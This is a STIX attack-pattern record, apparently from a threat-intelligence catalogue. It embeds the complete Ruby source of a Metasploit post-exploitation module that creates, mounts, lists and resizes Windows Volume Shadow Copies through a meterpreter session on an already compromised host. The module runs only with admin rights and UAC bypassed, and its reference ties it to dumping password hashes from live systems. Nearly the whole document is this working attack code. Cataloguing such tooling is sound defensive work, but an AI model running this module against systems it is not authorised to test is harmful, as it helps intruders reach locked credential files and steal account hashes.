{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d61e8936-c6df-4c9e-92be-6f04a169d87f",
    "created": "2024-08-14T16:33:04.974963Z",
    "modified": "2024-08-14T16:33:04.974968Z",
    "name": "Windows Manage Volume Shadow Copies",
    "description": " This module will perform management actions for Volume Shadow Copies on the system. This is based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett.  Works on win2k3 and later.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/vss.rb",
            "external_id": "vss.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20201111212952/https://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::FileSystem\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::ShadowCopy\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Volume Shadow Copies',\n        'Description' => %q{\n          This module will perform management actions for Volume Shadow Copies on the system. This is based on the VSSOwn\n          Script originally posted by Tim Tomes and Mark Baggett.\n\n          Works on win2k3 and later.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['theLightCosine'],\n        'References' => [\n          [ 'URL', 'https://web.archive.org/web/20201111212952/https://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/' ]\n        ],\n        'Actions' => [\n          [ 'VSS_CREATE', { 'Description' => 'Create a new VSS copy' } ],\n          [ 'VSS_LIST_COPIES', { 'Description' => 'List VSS copies' } ],\n          [ 'VSS_MOUNT', { 'Description' => 'Mount a VSS copy' } ],\n          [ 'VSS_UNMOUNT', { 'Description' => 'Unmount a VSS copy' } ],\n          [ 'VSS_GET_INFO', { 'Description' => 'Get VSS information' } ],\n          [ 'VSS_SET_MAX_STORAGE_SIZE', { 'Description' => 'Set the VSS maximum storage size' } ]\n        ],\n        'DefaultAction' => 'VSS_GET_INFO',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_dir\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('SIZE', [ false, 'Size in bytes to set for max storage.' ], conditions: %w[ACTION == VSS_SET_MAX_STORAGE_SIZE]),\n        OptString.new('VOLUME', [ false, 'Volume to make a copy of.', 'C:\\\\' ], conditions: %w[ACTION == VSS_CREATE]),\n        OptString.new('DEVICE', [ false, 'DeviceObject of the shadow copy to mount.' ], conditions: %w[ACTION == VSS_MOUNT]),\n        OptString.new('PATH', [ false, 'Path to use for mounting the shadow copy.', 'ShadowCopy' ], conditions: ['ACTION', 'in', %w[VSS_MOUNT VSS_UNMOUNT] ])\n      ]\n    )\n  end\n\n  def run\n    # all conditional options are required when active, make sure none of them are blank\n    options.each_pair do |name, option|\n      next if option.conditions.empty?\n      next unless Msf::OptCondition.show_option(self, option)\n\n      fail_with(Failure::BadConfig, \"The #{name} option is required by the #{action.name} action.\") if datastore[name].blank?\n    end\n\n    fail_with(Failure::NoAccess, 'This module requires administrative privileges to run') unless is_admin?\n    fail_with(Failure::NoAccess, 'This module requires UAC to be bypassed first') if is_uac_enabled?\n    fail_with(Failure::Unknown, 'Failed to start the necessary VSS services') unless start_vss\n\n    send(\"action_#{action.name.downcase}\")\n  end\n\n  def action_vss_create\n    if (id = create_shadowcopy(datastore['VOLUME']))\n      print_good \"Shadow Copy #{id} created!\"\n    end\n  end\n\n  def action_vss_get_info\n    return unless (storage_data = vss_get_storage)\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Shadow Copy Storage Data',\n      'Indent' => 2,\n      'Columns' => ['Field', 'Value']\n    )\n    storage_data.each_pair { |k, v| tbl << [k, v] }\n    print_good(tbl.to_s)\n    store_loot('host.shadowstorage', 'text/plain', session, tbl.to_s, 'shadowstorage.txt', 'Shadow Copy Storage Info')\n  end\n\n  def action_vss_mount\n    print_status('Creating the symlink...')\n    device = datastore['DEVICE']\n    unless device =~ %r{^([/\\\\])\\1\\?\\1GLOBALROOT\\1Device\\1([\\w\\- ]+)\\1?$}\n      fail_with(Failure::BadConfig, 'The DEVICE parameter is incorrect, it should begin with \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\')\n    end\n    device << Regexp.last_match(1) unless device.end_with?(Regexp.last_match(1)) # the DEVICE parameter needs to end with / or the link will be created successfully but will not work\n\n    if create_symlink(datastore['PATH'], device, directory: true)\n      print_good('Mounted successfully')\n    end\n  end\n\n  def action_vss_unmount\n    print_status('Deleting the symlink...')\n    session.fs.dir.rmdir(datastore['PATH'])\n  end\n\n  def action_vss_list_copies\n    shadow_copies = vss_list\n    return if shadow_copies.empty?\n\n    list = ''\n    shadow_copies.each do |copy|\n      tbl = Rex::Text::Table.new(\n        'Header' => 'Shadow Copy Data',\n        'Indent' => 2,\n        'Columns' => ['Field', 'Value']\n      )\n      copy.each_pair { |k, v| tbl << [k, v] }\n      list << \" #{tbl} \\n\\n\"\n      print_good tbl.to_s\n    end\n    store_loot('host.shadowcopies', 'text/plain', session, list, 'shadowcopies.txt', 'Shadow Copy Info')\n  end\n\n  def action_vss_set_max_storage_size\n    if vss_set_storage(datastore['SIZE'])\n      print_good('Size updated successfully')\n    else\n      print_error('There was a problem updating the storage size')\n    end\n  end\nend\n"
}